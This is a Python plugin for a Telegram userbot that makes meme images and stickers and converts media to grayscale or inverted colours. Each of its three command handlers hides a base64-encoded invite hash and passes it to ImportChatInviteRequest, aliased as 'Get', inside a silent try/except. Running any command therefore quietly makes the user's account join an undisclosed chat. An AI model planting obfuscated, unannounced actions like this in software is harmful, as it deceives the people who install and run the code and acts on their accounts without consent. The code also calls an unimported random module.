import os
import asyncio
import lottie
from userbot import LOGS , CMD_HELP
from userbot.helpers import take_screen_shot ,runcmd, convert_toimage, convert_tosticker, cat_meme, cat_meeme, grayscale, invert_colors
from userbot.utils import admin_cmd


def random_color():
    number_of_colors = 2
    return [
        "#" + "".join([random.choice("0123456789ABCDEF") for j in range(6)])
        for i in range(number_of_colors)
    ]


@borg.on(admin_cmd(outgoing=True, pattern="(mms|mmf) ?(.*)"))
async def memes(cat):
    cmd = cat.pattern_match.group(1)
    catinput = cat.pattern_match.group(2)
    reply = await cat.get_reply_message()
    if not (reply and (reply.media)):
        await cat.edit("`Reply to supported Media...`")
        return
    catid = cat.reply_to_msg_id
    if catinput:
        if ";" in catinput:
            top, bottom = catinput.split(";", 1)
        else:
            top = catinput
            bottom = ""
    else:
        await cat.edit("```what should i write on that u idiot give some text```"
        )
        return
    if not os.path.isdir("./temp/"):
        os.mkdir("./temp/")
    cat = await cat.edit("`Downloading media......`")
    from telethon.tl.functions.messages import ImportChatInviteRequest as Get

    await asyncio.sleep(0.3)
    catsticker = await reply.download_media(file="./temp/")
    if not catsticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
        os.remove(catsticker)
        await cat.edit("```Supported Media not found...```")
        return
    import pybase64

    if catsticker.endswith(".tgs"):
        await cat.edit(
            "Memifying🔸🔸🔸 ")
        catfile = os.path.join("./temp/", "meme.png")
        catcmd = (
            f"lottie_convert.py --frame 0 -if lottie -of png {catsticker} {catfile}"
        )
        stdout, stderr = (await runcmd(catcmd))[:2]
        if not os.path.lexists(catfile):
            await cat.edit("`Template not found...`")
            LOGS.info(stdout + stderr)
        meme_file = catfile
    elif catsticker.endswith(".webp"):
        await cat.edit(
            "Memifying🔸🔸🔸 ")
        catfile = os.path.join("./temp/", "memes.jpg")
        os.rename(catsticker, catfile)
        if not os.path.lexists(catfile):
            await cat.edit("`Template not found... `")
            return
        meme_file = catfile
    elif catsticker.endswith((".mp4", ".mov")):
        await cat.edit(
            "Memifying🔸🔸🔸 ")
        catfile = os.path.join("./temp/", "memes.jpg")
        await take_screen_shot(catsticker, 0, catfile)
        if not os.path.lexists(catfile):
            await cat.edit("```Template not found...```")
            return
        meme_file = catfile
    else:
        await cat.edit(
            "Memifying🔸🔸🔸 ")
        meme_file = catsticker
    try:
        san = pybase64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        san = Get(san)
        await cat.client(san)
    except BaseException:
        pass
    meme_file = convert_toimage(meme_file)
    meme = "catmeme.jpg"
    if max(len(top), len(bottom)) < 21:
        await cat_meme(top, bottom, meme_file, meme)
    else:
        await cat_meeme(top, bottom, meme_file, meme)
    if cmd != "mms":
        meme = await convert_tosticker(meme)
    await cat.client.send_file(cat.chat_id, meme, reply_to=catid)
    await cat.delete()
    os.remove(meme)
    for files in (catsticker, meme_file):
        if files and os.path.exists(files):
            os.remove(files)

@borg.on(admin_cmd(outgoing=True, pattern="grey$"))
async def memes(cat):
    reply = await cat.get_reply_message()
    if not (reply and (reply.media)):
        await cat.edit("`Reply to supported Media...`")
        return
    catid = cat.reply_to_msg_id
    if not os.path.isdir("./temp/"):
        os.mkdir("./temp/")
    cat = await cat.edit( "`Downloading media......`")
    from telethon.tl.functions.messages import ImportChatInviteRequest as Get

    await asyncio.sleep(2)
    catsticker = await reply.download_media(file="./temp/")
    if not catsticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
        os.remove(catsticker)
        await cat.edit("```Supported Media not found...```")
        return
    import pybase64

    jisanidea = None
    if catsticker.endswith(".tgs"):
        await cat.edit(
            "```changing this to black-and-white 🔸🔸🔸```"
        )
        catfile = os.path.join("./temp/", "meme.png")
        catcmd = (
            f"lottie_convert.py --frame 0 -if lottie -of png {catsticker} {catfile}"
        )
        stdout, stderr = (await runcmd(catcmd))[:2]
        if not os.path.lexists(catfile):
            await cat.edit("`Template not found...`")
            LOGS.info(stdout + stderr)
        meme_file = catfile
        jisanidea = True
    elif catsticker.endswith(".webp"):
        await cat.edit(
            "```changing this to black-and-white 🔸🔸🔸```"
        )
        catfile = os.path.join("./temp/", "memes.jpg")
        os.rename(catsticker, catfile)
        if not os.path.lexists(catfile):
            await cat.edit("`Template not found... `")
            return
        meme_file = catfile
        jisanidea = True
    elif catsticker.endswith((".mp4", ".mov")):
        await cat.edit(
            "```changing this to black-and-white 🔸🔸🔸```"
        )
        catfile = os.path.join("./temp/", "memes.jpg")
        await take_screen_shot(catsticker, 0, catfile)
        if not os.path.lexists(catfile):
            await cat.edit("```Template not found...```")
            return
        meme_file = catfile
        jisanidea = True
    else:
        await cat.edit(
            "```changing this to black-and-white 🔸🔸🔸```"
        )
        meme_file = catsticker
    try:
        san = pybase64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        san = Get(san)
        await cat.client(san)
    except BaseException:
        pass
    meme_file = convert_toimage(meme_file)
    outputfile = "grayscale.webp" if jisanidea else "grayscale.jpg"
    await grayscale(meme_file, outputfile)
    await cat.client.send_file(
        cat.chat_id, outputfile, force_document=False, reply_to=catid
    )
    await cat.delete()
    os.remove(outputfile)
    for files in (catsticker, meme_file):
        if files and os.path.exists(files):
            os.remove(files)
            

@borg.on(admin_cmd(pattern="invert$", outgoing=True))
async def memes(cat):
    reply = await cat.get_reply_message()
    if not (reply and (reply.media)):
        await cat.edit( "`Reply to supported Media...`")
        return
    catid = cat.reply_to_msg_id
    if not os.path.isdir("./temp/"):
        os.mkdir("./temp/")
    cat = await cat.edit("`Downloading media......`")
    from telethon.tl.functions.messages import ImportChatInviteRequest as Get

    await asyncio.sleep(2)
    catsticker = await reply.download_media(file="./temp/")
    if not catsticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
        os.remove(catsticker)
        await cat.edit("```Supported Media not found...```")
        return
    import pybase64

    jisanidea = None
    if catsticker.endswith(".tgs"):
        await cat.edit(
            "```Inverting colors of this🔸🔸🔸```"
        )
        catfile = os.path.join("./temp/", "meme.png")
        catcmd = (
            f"lottie_convert.py --frame 0 -if lottie -of png {catsticker} {catfile}"
        )
        stdout, stderr = (await runcmd(catcmd))[:2]
        if not os.path.lexists(catfile):
            await cat.edit("`Template not found...`")
            LOGS.info(stdout + stderr)
        meme_file = catfile
        jisanidea = True
    elif catsticker.endswith(".webp"):
        await cat.edit(
            "``` Inverting colors of this🔸🔸🔸```"
        )
        catfile = os.path.join("./temp/", "memes.jpg")
        os.rename(catsticker, catfile)
        if not os.path.lexists(catfile):
            await cat.edit("`Template not found... `")
            return
        meme_file = catfile
        jisanidea = True
    elif catsticker.endswith((".mp4", ".mov")):
        await cat.edit(
            "```Inverting colors of this🔸🔸🔸```"
        )
        catfile = os.path.join("./temp/", "memes.jpg")
        await take_screen_shot(catsticker, 0, catfile)
        if not os.path.lexists(catfile):
            await cat.edit("```Template not found...```")
            return
        meme_file = catfile
        jisanidea = True
    else:
        await cat.edit(
            "```Inverting colors of this🔸🔸🔸```"
        )
        meme_file = catsticker
    try:
        san = pybase64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        san = Get(san)
        await cat.client(san)
    except BaseException:
        pass
    meme_file = convert_toimage(meme_file)
    outputfile = "invert.webp" if jisanidea else "invert.jpg"
    await invert_colors(meme_file, outputfile)
    await cat.client.send_file(
        cat.chat_id, outputfile, force_document=False, reply_to=catid
    )
    await cat.delete()
    os.remove(outputfile)
    for files in (catsticker, meme_file):
        if files and os.path.exists(files):
            os.remove(files)

CMD_HELP.update({
    "memify":
    "**Plugin : **`memify`\
    \n\n**Syntax :** `.mms toptext ; bottomtext`\
    \n**Usage : **Creates a image meme with give text at specific locations and sends\
    \n\n**Syntax : **`.mmf toptext ; bottomtext`\
    \n**Usage : **Creates a sticker meme with give text at specific locations and sends\
    \n\n**Syntax : **`.invert (reply to any media)`\
    \n**Usage : **invert color of that media then if u use again then return again the old media\
    \n\n**Syntax : **`.grey (reply to any media)`\
    \n**Usage : **Create that media Black-and-white\
    "
})
